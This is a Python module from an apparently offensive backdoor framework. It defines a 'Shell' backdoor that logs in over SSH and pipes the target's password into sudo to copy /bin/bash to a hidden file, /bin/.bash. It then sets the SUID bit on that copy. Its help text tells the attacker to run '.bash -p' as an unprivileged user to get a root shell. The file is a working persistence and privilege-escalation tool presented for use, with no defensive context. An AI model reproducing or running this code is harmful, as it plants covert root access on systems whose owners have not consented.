from backdoor import *

class Shell(Backdoor):
    prompt = Fore.RED + "(shell) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Shell backdoor..."
        self.core = core
        self.options = {
                "name"   : Option("name", "/bin/.bash", "name of the duplicated shell", True),
                }
        
        self.modules = {} 
        self.allow_modules = True
        self.help_text = GOOD + "The shell backdoor is a priviledge escalation backdoor, similar to (but more powerful than) it's SetUID escalation brother. It duplicates the bash shell to a hidden binary, and sets the SUID bit. Unlike the SetUID backdoor though, this shell gives an unpriviledged user root priviledge with a full shell.  To use, while SSHed in as an unpriviledged user, simply run \".bash -p\", and you will have root access." 

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S cp /bin/bash " + self.get_value("name") + " && echo " + self.core.curtarget.pword + " | sudo -S chmod 4755 " + self.get_value("name")

    def do_exploit(self, args):
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Shell Backdoor attempted.")
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()

